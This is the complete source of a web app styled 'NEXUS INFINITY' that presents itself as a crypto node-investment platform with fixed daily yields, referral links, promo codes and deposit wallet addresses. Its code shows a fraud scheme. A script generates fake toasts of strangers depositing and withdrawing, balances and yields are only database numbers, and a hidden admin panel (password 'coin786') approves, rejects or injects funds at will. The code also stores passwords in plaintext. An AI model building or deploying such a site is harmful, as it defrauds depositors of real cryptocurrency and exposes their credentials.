<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS INFINITY | Sovereign Global Infrastructure</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&family=Syncopate:wght@700&display=swap');
        :root { --n-pink: #ff00ff; --n-blue: #00d4ff; --bg: #030508; }
        body { background: var(--bg); color: #f1f5f9; font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.01); backdrop-filter: blur(60px); border: 1px solid rgba(255, 255, 255, 0.04); border-radius: 35px; }
        .btn-master { background: linear-gradient(135deg, #ff00ff, #00d4ff); font-weight: 800; padding: 20px; border-radius: 24px; text-transform: uppercase; width: 100%; border: none; color: white; cursor: pointer; transition: 0.4s; box-shadow: 0 15px 35px rgba(255, 0, 255, 0.15); }
        .input-hub { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 20px; padding: 18px; color: white; width: 100%; outline: none; }
        #viral-toast { position: fixed; top: 50px; left: 50%; transform: translateX(-50%) translateY(-200%); z-index: 10001; transition: 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55); width: 90%; max-width: 350px; }
        #viral-toast.active { transform: translateX(-50%) translateY(0); }
        .nav-item { color: #334155; transition: 0.4s; text-align: center; flex: 1; cursor: pointer; }
        .nav-active { color: #fff; text-shadow: 0 0 10px var(--n-pink); }
        .marquee-box { background: black; border-bottom: 1px solid rgba(255, 255, 255, 0.05); height: 40px; display: flex; align-items: center; position: fixed; top: 0; width: 100%; z-index: 100; font-family: 'Syncopate'; }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .marquee-text { white-space: nowrap; animation: marquee 25s linear infinite; font-size: 9px; color: var(--n-blue); letter-spacing: 3px; }
        .hidden { display: none !important; }
    </style>
</head>
<body>

    <div class="marquee-box"><div id="broadcast-msg" class="marquee-text uppercase">NEXUS GLOBAL SETTLEMENT ENGINE ACTIVE... SECURED BY AES-512... MULTI-CHAIN PROTOCOL LIVE...</div></div>

    <div id="viral-toast" class="glass p-5 flex items-center gap-5 border-t-2 border-pink-500 shadow-2xl">
        <div class="w-12 h-12 rounded-2xl bg-gradient-to-br from-pink-600 to-blue-600 flex items-center justify-center text-xl shadow-lg"><i class="fa-solid fa-globe text-white"></i></div>
        <div class="flex-1">
            <p id="toast-user" class="text-[10px] font-black uppercase text-white italic">User_77** (London)</p>
            <p id="toast-action" class="text-[9px] font-bold text-zinc-500 uppercase">Just Injected $1,500.00</p>
        </div>
    </div>

    <div id="splash" class="fixed inset-0 bg-[#030508] z-[9999] flex flex-col items-center justify-center">
        <div class="w-28 h-28 bg-gradient-to-tr from-pink-600 to-blue-600 rounded-[2.8rem] flex items-center justify-center text-6xl font-black italic shadow-[0_0_80px_rgba(255,0,255,0.2)] animate-pulse">N</div>
        <h1 style="font-family: 'Syncopate'" class="mt-10 text-[10px] tracking-[1em] text-white/20 uppercase">Sovereign Terminal</h1>
    </div>

    <div id="auth-section" class="min-h-screen flex items-center justify-center p-8 hidden">
        <div class="max-w-md w-full glass p-10 space-y-10 border-b-4 border-blue-600">
            <div id="login-ui" class="space-y-8">
                <div class="text-center"><h2 class="text-4xl font-black italic uppercase">Authorized <span class="text-pink-500 block text-sm tracking-[8px] mt-2">Login</span></h2></div>
                <input type="text" id="l-user" placeholder="Terminal ID" class="input-hub">
                <input type="password" id="l-pass" placeholder="Security Key" class="input-hub">
                <button onclick="handleLogin()" class="btn-master">Authorize Access</button>
                <p onclick="toggleAuth(true)" class="text-center text-[10px] text-blue-400 font-black uppercase cursor-pointer">Initialize New Identity</p>
            </div>
            <div id="signup-ui" class="space-y-8 hidden">
                <h2 class="text-3xl font-black italic uppercase text-center text-blue-500">System <span class="text-white block text-sm tracking-[5px] mt-2">Registration</span></h2>
                <input type="text" id="s-user" placeholder="Create ID" class="input-hub">
                <input type="password" id="s-pass" placeholder="Create Key" class="input-hub">
                <input type="text" id="s-ref" placeholder="Referral Protocol (Optional)" class="input-hub" readonly>
                <button onclick="handleSignup()" class="btn-master">Initialize Identity</button>
                <p onclick="toggleAuth(false)" class="text-center text-[10px] text-zinc-500 font-black uppercase cursor-pointer">Back to Hub</p>
            </div>
        </div>
    </div>

    <div id="dashboard" class="hidden pt-16 pb-36">
        <header class="p-6 flex justify-between items-center sticky top-10 bg-[#030508]/80 backdrop-blur-3xl z-50 border-b border-white/5">
            <div class="flex items-center gap-5">
                <div id="admin-trigger" class="w-14 h-14 bg-white/5 rounded-2xl flex items-center justify-center font-black italic text-pink-500 text-3xl border border-white/10">N</div>
                <div><p id="nav-user" class="text-lg font-black uppercase text-white italic">...</p><p class="text-[8px] text-blue-500 font-black uppercase tracking-[3px]">● Institutional Sync</p></div>
            </div>
            <button onclick="logout()" class="w-10 h-10 rounded-full bg-white/5 flex items-center justify-center text-zinc-600"><i class="fa-solid fa-power-off"></i></button>
        </header>

        <main id="page-home" class="p-6 space-y-8">
            <div class="glass p-10 relative overflow-hidden bg-gradient-to-br from-indigo-500/10 to-transparent">
                <p class="text-[10px] font-black text-zinc-500 uppercase tracking-[4px] mb-3">Net Liquidity Balance</p>
                <h2 id="balance-txt" class="text-6xl font-black italic tracking-tighter">$0.00</h2>
                <div class="mt-12 flex justify-between items-end border-t border-white/5 pt-8">
                    <div><p class="text-[9px] text-zinc-600 uppercase font-black mb-1">Total Yield</p><p id="profit-txt" class="text-2xl font-black text-pink-500">+$0.00</p></div>
                    <button onclick="copyRef()" class="bg-blue-600/20 text-blue-400 px-5 py-2.5 rounded-2xl text-[9px] font-black uppercase italic border border-blue-500/20">Copy Ref Link</button>
                </div>
            </div>

            <div class="glass p-8 space-y-5 border-l-4 border-yellow-500">
                <h3 class="text-[10px] font-black uppercase text-zinc-400 tracking-[3px]">Institutional Promo Code</h3>
                <div class="flex gap-3">
                    <input type="text" id="promo-input" placeholder="Enter Code" class="input-hub !py-3 font-black text-center uppercase">
                    <button onclick="redeemPromo()" class="bg-yellow-500 text-black px-8 rounded-2xl font-black text-[10px] uppercase italic">Apply</button>
                </div>
            </div>

            <h3 class="text-xs font-black uppercase tracking-widest text-zinc-500 ml-2">Active Protocol Nodes</h3>
            <div id="active-nodes-list" class="grid gap-5"></div>
        </main>

        <main id="page-market" class="p-6 space-y-8 hidden">
            <h3 class="text-2xl font-black italic uppercase text-blue-400">Node Marketplace</h3>
            <div id="market-list" class="grid gap-6 pb-20"></div>
        </main>

        <main id="page-vault" class="p-6 space-y-10 hidden">
            <div class="glass p-8 space-y-8">
                <h3 class="text-xl font-black uppercase text-pink-500 italic">Inject Equity</h3>
                <div class="grid grid-cols-3 gap-3">
                    <div onclick="setDep('TRX','TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76')" class="bg-white/5 py-4 rounded-2xl flex flex-col items-center border border-white/5 cursor-pointer hover:border-pink-500/50 transition-all"><i class="fa-solid fa-gem text-blue-400 mb-2"></i><p class="text-[9px] font-black">TRX</p></div>
                    <div onclick="setDep('ETH','0xD9359EADE5F5bACA51fb7da043767Bc0685bC355')" class="bg-white/5 py-4 rounded-2xl flex flex-col items-center border border-white/5 cursor-pointer hover:border-pink-500/50 transition-all"><i class="fa-brands fa-ethereum text-indigo-400 mb-2"></i><p class="text-[9px] font-black">ETH</p></div>
                    <div onclick="setDep('USDT','TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ')" class="bg-white/5 py-4 rounded-2xl flex flex-col items-center border border-white/5 cursor-pointer hover:border-pink-500/50 transition-all"><i class="fa-solid fa-dollar-sign text-green-400 mb-2"></i><p class="text-[9px] font-black">USDT</p></div>
                </div>
                <div id="dep-form" class="hidden space-y-6 pt-6 border-t border-white/10">
                    <div class="text-center"><p id="dep-addr" class="text-[10px] font-mono break-all bg-black p-4 rounded-2xl text-zinc-400 border border-white/5 select-all"></p></div>
                    <input type="number" id="dep-amt" placeholder="Amount ($)" class="input-hub">
                    <input type="text" id="dep-tid" placeholder="Transaction Hash" class="input-hub">
                    <button onclick="submitDep()" class="btn-master">Verify Settlement</button>
                </div>
            </div>
            <div class="glass p-8 space-y-8">
                <h3 class="text-xl font-black uppercase text-blue-400 italic">Global Payout</h3>
                <input type="text" id="w-addr" placeholder="Destination Wallet" class="input-hub">
                <input type="number" id="w-amt" placeholder="Payout Amount ($)" class="input-hub">
                <button onclick="submitWith()" class="btn-master !bg-white !text-black">Initialize Egress</button>
            </div>
        </main>

        <main id="page-logs" class="p-6 space-y-8 hidden">
            <h3 class="text-xl font-black uppercase italic mb-8">Protocol Ledger</h3>
            <div id="history-list" class="grid gap-4"></div>
        </main>

        <nav class="fixed bottom-0 left-0 right-0 p-8 bg-[#030508]/90 backdrop-blur-3xl border-t border-white/5 flex justify-around items-center z-[1000]">
            <div onclick="switchPage('home')" class="nav-item nav-active"><i class="fa-solid fa-bolt text-2xl"></i><p class="text-[8px] font-black mt-2">CORE</p></div>
            <div onclick="switchPage('market')" class="nav-item"><i class="fa-solid fa-server text-2xl"></i><p class="text-[8px] font-black mt-2">NODES</p></div>
            <div onclick="switchPage('vault')" class="nav-item"><i class="fa-solid fa-wallet text-2xl"></i><p class="text-[8px] font-black mt-2">VAULT</p></div>
            <div onclick="switchPage('logs')" class="nav-item"><i class="fa-solid fa-receipt text-2xl"></i><p class="text-[8px] font-black mt-2">LOGS</p></div>
        </nav>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-[#030508] z-[10000] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10 pb-6 border-b border-white/10">
            <h2 class="text-2xl font-black italic text-pink-500 uppercase">Imperial Control</h2>
            <button onclick="document.getElementById('admin-panel').classList.add('hidden')" class="text-5xl">&times;</button>
        </div>
        <div class="space-y-10">
            <div class="glass p-8 space-y-6 border-l-4 border-yellow-500">
                <h4 class="text-[10px] font-black uppercase text-zinc-500">Promo Code Config</h4>
                <input type="text" id="adm-p-code" placeholder="Code (e.g. ALPHA100)" class="input-hub">
                <input type="number" id="adm-p-val" placeholder="Value ($)" class="input-hub">
                <button onclick="updatePromoConfig()" class="btn-master !py-3 !bg-yellow-500 !text-black">Sync Global Promo</button>
            </div>
            <div class="glass p-8 space-y-6 border-l-4 border-blue-500">
                <h4 class="text-[10px] font-black uppercase text-zinc-500">Inject Portfolio Equity</h4>
                <input type="text" id="adm-u-id" placeholder="Username" class="input-hub">
                <input type="number" id="adm-u-amt" placeholder="Amount ($)" class="input-hub">
                <button onclick="adminInject()" class="btn-master !py-3 !bg-blue-600">Inject Balance</button>
            </div>
            <div id="admin-requests" class="grid gap-6"></div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // MARKET DATA
        const marketNodes = Array.from({length: 22}, (_, i) => ({
            id: i+1, title: `Protocol Node X-${i+1}`, price: (i+1)*35, daily: (i+1)*4.5, days: 30, img: `https://picsum.photos/seed/node${i+100}/400/220`
        }));

        // INITIAL LOAD
        window.onload = () => {
            const urlParams = new URLSearchParams(window.location.search);
            if(urlParams.has('ref')) { document.getElementById('s-ref').value = urlParams.get('ref'); }
            
            renderMarket();
            startViralEngine();
            setTimeout(() => { 
                document.getElementById('splash').style.display = 'none'; 
                const u = localStorage.getItem('nexus_user'); 
                if(u) showDashboard(u); else document.getElementById('auth-section').classList.remove('hidden'); 
            }, 3000);
        };

        function startViralEngine() {
            const locs = ["(Dubai)", "(Tokyo)", "(London)", "(USA)"], acts = ["Just Deposited $5,000", "Withdrew $1,200", "Redeemed Promo Code"];
            setInterval(() => {
                document.getElementById('toast-user').innerText = `User_${Math.floor(Math.random()*9000+1000)}** ${locs[Math.floor(Math.random()*locs.length)]}`;
                document.getElementById('toast-action').innerText = acts[Math.floor(Math.random()*acts.length)];
                document.getElementById('viral-toast').classList.add('active');
                setTimeout(() => document.getElementById('viral-toast').classList.remove('active'), 4000);
            }, 9000);
        }

        // REAL NODE BUYING
        window.buyNode = async (nodeId) => {
            const u = localStorage.getItem('nexus_user');
            const node = marketNodes.find(n => n.id === nodeId);
            const s = await get(ref(db, `users/${u}`));
            const d = s.val();
            if (d.balance >= node.price) {
                const nodeKey = push(ref(db, `users/${u}/nodes`)).key;
                await update(ref(db, `users/${u}`), { balance: d.balance - node.price });
                await set(ref(db, `users/${u}/nodes/${nodeKey}`), { ...node, lastClaim: Date.now() });
                alert("Sweetie! Node Activated! 🚀");
            } else {
                alert("Insufficient Balance! Deposit first.");
                switchPage('vault');
            }
        };

        function renderMarket() {
            document.getElementById('market-list').innerHTML = marketNodes.map(n => `
                <div class="glass overflow-hidden"><img src="${n.img}" class="w-full h-40 object-cover opacity-20"><div class="p-8 flex justify-between items-center"><div><h4 class="font-black italic uppercase text-sm">${n.title}</h4><p class="text-[10px] font-bold text-green-500 mt-2">Yield: $${n.daily.toFixed(2)} / 24H</p></div><div class="text-right"><p class="text-2xl font-black text-white">$${n.price}</p><button onclick="buyNode(${n.id})" class="mt-4 bg-white text-black px-8 py-2 rounded-2xl text-[10px] font-black uppercase italic">Activate</button></div></div></div>`).join('');
        }

        window.redeemPromo = async () => {
            const u = localStorage.getItem('nexus_user'), code = document.getElementById('promo-input').value.trim();
            const sys = await get(ref(db, 'system/promo')), userS = await get(ref(db, `users/${u}`));
            if(!sys.exists() || code !== sys.val().code) return alert("Invalid Code!");
            if(userS.val().usedPromo) return alert("Already used!");
            await update(ref(db, `users/${u}`), { balance: (userS.val().balance || 0) + parseFloat(sys.val().value), usedPromo: true });
            alert("Bonus Applied! 💎");
        };

        window.handleLogin = async () => { 
            const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value.trim();
            const s = await get(ref(db, `users/${u}`));
            if(s.exists() && s.val().password === p) { localStorage.setItem('nexus_user', u); showDashboard(u); } else alert("Access Denied.");
        };

        window.handleSignup = async () => { 
            const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value.trim(), r = document.getElementById('s-ref').value.trim();
            if(u && p) { await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0, referredBy: r }); alert("Identity Created!"); toggleAuth(false); }
        };

        function showDashboard(uid) {
            document.getElementById('auth-section').classList.add('hidden');
            document.getElementById('dashboard').classList.remove('hidden');
            document.getElementById('nav-user').innerText = uid;
            onValue(ref(db, `users/${uid}`), (snap) => {
                const d = snap.val(); if(!d) return;
                document.getElementById('balance-txt').innerText = '$' + (d.balance || 0).toFixed(2);
                document.getElementById('profit-txt').innerText = '+$' + (d.profit || 0).toFixed(2);
                
                const nodes = d.nodes ? Object.entries(d.nodes) : [];
                document.getElementById('active-nodes-list').innerHTML = nodes.map(([k, n]) => {
                    if(Date.now() - n.lastClaim >= 86400000) {
                        update(ref(db, `users/${uid}`), { profit: (d.profit || 0) + n.daily });
                        update(ref(db, `users/${uid}/nodes/${k}`), { lastClaim: Date.now() });
                    }
                    return `<div class="glass p-7 border-l-4 border-blue-500 flex justify-between items-center"><div><p class="text-[11px] font-black uppercase">${n.title}</p><p class="text-[9px] font-bold text-zinc-600">Daily: $${n.daily.toFixed(2)}</p></div><p class="text-[9px] font-black text-blue-400 animate-pulse">ACTIVE</p></div>`;
                }).join('') || '<p class="text-center opacity-30 py-10 uppercase font-black text-[10px]">No Nodes Active</p>';

                const history = d.history ? Object.values(d.history).reverse() : [];
                document.getElementById('history-list').innerHTML = history.map(h => `
                    <div class="glass p-6 border-r-4 ${h.status === 'Approved' ? 'border-green-500' : 'border-pink-500'} flex justify-between items-center">
                        <div><p class="text-[11px] font-black uppercase">${h.type}</p><p class="text-[8px] text-zinc-600 mt-2">${h.date}</p></div>
                        <div class="text-right"><p class="text-sm font-black italic">$${h.amount}</p><p class="text-[9px] font-black uppercase ${h.status === 'Approved' ? 'text-green-500' : 'text-pink-500'}">${h.status}</p></div>
                    </div>`).join('');
            });
        }

        // ADMIN FUNCTIONS
        window.updatePromoConfig = async () => {
            const c = document.getElementById('adm-p-code').value.trim(), v = document.getElementById('adm-p-val').value;
            await set(ref(db, 'system/promo'), { code: c, value: v }); alert("Synced!");
        };
        window.adminInject = async () => {
            const u = document.getElementById('adm-u-id').value.trim(), a = parseFloat(document.getElementById('adm-u-amt').value);
            const s = await get(ref(db, `users/${u}`));
            if(s.exists()) { await update(ref(db, `users/${u}`), { balance: (s.val().balance || 0) + a }); alert("Injected!"); }
        };

        // NAVIGATION & UTILS
        let sMet = ''; window.setDep = (t, a) => { sMet = t; document.getElementById('dep-addr').innerText = a; document.getElementById('dep-form').classList.remove('hidden'); navigator.clipboard.writeText(a); };
        window.submitDep = async () => {
            const u = localStorage.getItem('nexus_user'), amt = document.getElementById('dep-amt').value, tid = document.getElementById('dep-tid').value;
            const hKey = push(ref(db, `users/${u}/history`)).key;
            const ent = { user: u, amount: amt, tid, status: 'Pending', date: new Date().toLocaleString(), type: 'Deposit', hKey };
            await set(ref(db, `users/${u}/history/${hKey}`), ent); await set(ref(db, 'admin/requests/' + hKey), ent); alert("Submitted!");
        };
        window.submitWith = async () => {
            const u = localStorage.getItem('nexus_user'), amt = parseFloat(document.getElementById('w-amt').value), s = await get(ref(db, `users/${u}`));
            if(amt < 10 || s.val().profit < amt) return alert("Invalid amount!");
            const hKey = push(ref(db, `users/${u}/history`)).key;
            const ent = { user: u, amount: amt, status: 'Pending', date: new Date().toLocaleString(), type: 'Withdrawal', hKey };
            await update(ref(db, `users/${u}`), { profit: s.val().profit - amt });
            await set(ref(db, `users/${u}/history/${hKey}`), ent); await set(ref(db, 'admin/requests/' + hKey), ent); alert("Requested!");
        };
        window.switchPage = (p) => { ['home','market','vault','logs'].forEach(x => document.getElementById('page-'+x).classList.add('hidden')); document.getElementById('page-'+p).classList.remove('hidden'); document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('nav-active')); event.currentTarget.classList.add('nav-active'); };
        window.toggleAuth = (s) => { document.getElementById('login-ui').classList.toggle('hidden', s); document.getElementById('signup-ui').classList.toggle('hidden', !s); };
        window.logout = () => { localStorage.clear(); location.reload(); };
        window.copyRef = () => { navigator.clipboard.writeText(window.location.origin + window.location.pathname + "?ref=" + localStorage.getItem('nexus_user')); alert("Referral Copied!"); };
        let taps = 0; document.getElementById('admin-trigger').onclick = () => { taps++; if(taps === 4) { if(prompt("Pass:") === "coin786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); } taps = 0; } };

        function loadAdmin() {
            onValue(ref(db, 'admin/requests'), (snap) => {
                const d = snap.val();
                document.getElementById('admin-requests').innerHTML = d ? Object.entries(d).map(([id, l]) => `
                    <div class="glass p-7 border border-white/10">
                        <p class="text-[11px] font-black uppercase text-pink-500">${l.type} - $${l.amount}</p>
                        <p class="text-[9px] font-bold text-zinc-500">USER: ${l.user} | TID: ${l.tid || 'N/A'}</p>
                        <div class="grid grid-cols-2 gap-4 mt-5"><button onclick="manage('${id}','${l.user}',${l.amount},'${l.hKey}','approve','${l.type}')" class="bg-green-500/20 text-green-500 py-3 rounded-2xl text-[10px] font-black">Approve</button><button onclick="manage('${id}','${l.user}',${l.amount},'${l.hKey}','reject','${l.type}')" class="bg-red-500/20 text-red-500 py-3 rounded-2xl text-[10px] font-black">Reject</button></div>
                    </div>`).join('') : '<p class="text-center opacity-30 py-10 uppercase font-black text-[10px]">No Requests</p>';
            });
        }
        window.manage = async (id, user, amt, hKey, action, type) => {
            if(action === 'approve' && type === 'Deposit') { const s = await get(ref(db, `users/${user}`)); await update(ref(db, `users/${user}`), { balance: (s.val().balance || 0) + parseFloat(amt) }); }
            if(action === 'reject' && type === 'Withdrawal') { const s = await get(ref(db, `users/${user}`)); await update(ref(db, `users/${user}`), { profit: (s.val().profit || 0) + parseFloat(amt) }); }
            await update(ref(db, `users/${user}/history/${hKey}`), { status: action === 'approve' ? 'Approved' : 'Rejected' });
            await remove(ref(db, 'admin/requests/' + id));
        };
    </script>
</body>
</html>
